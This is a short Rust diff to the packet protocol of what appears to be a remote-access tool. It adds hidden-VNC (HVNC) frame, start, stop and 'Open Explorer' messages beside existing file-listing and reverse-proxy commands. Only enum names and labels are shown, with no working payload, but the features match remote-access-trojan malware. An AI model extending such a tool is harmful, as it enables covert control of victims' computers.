@@ -44,7 +44,9 @@ pub enum ServerboundPacket {
 
     DisksResult(Vec<String>),
     FileList(Vec<File>),
-    CurrentFolder(String),    
+    CurrentFolder(String),   
+
+    HVNCFrame(Vec<u8>),
 }
 
 impl Packet for ServerboundPacket {
@@ -73,6 +75,7 @@ impl Packet for ServerboundPacket {
             ServerboundPacket::DisksResult(_) => "Disks Result",
             ServerboundPacket::FileList(_) => "File List",
             ServerboundPacket::CurrentFolder(_) => "Current Folder",
+            ServerboundPacket::HVNCFrame(_) => "HVNC Frame",
         }
     }
 }
@@ -114,6 +117,10 @@ pub enum ClientboundPacket {
 
     StartReverseProxy(String),
     StopReverseProxy,
+
+    StartHVNC,
+    StopHVNC,
+    OpenExplorer,
 }
 
 impl Packet for ClientboundPacket {
@@ -161,6 +168,10 @@ impl Packet for ClientboundPacket {
 
             ClientboundPacket::StartReverseProxy(_) => "Start Reverse Proxy",
             ClientboundPacket::StopReverseProxy => "Stop Reverse Proxy",
+
+            ClientboundPacket::StartHVNC => "Start HVNC",
+            ClientboundPacket::StopHVNC => "Stop HVNC",
+            ClientboundPacket::OpenExplorer => "Open Explorer",
         }
     }
 }
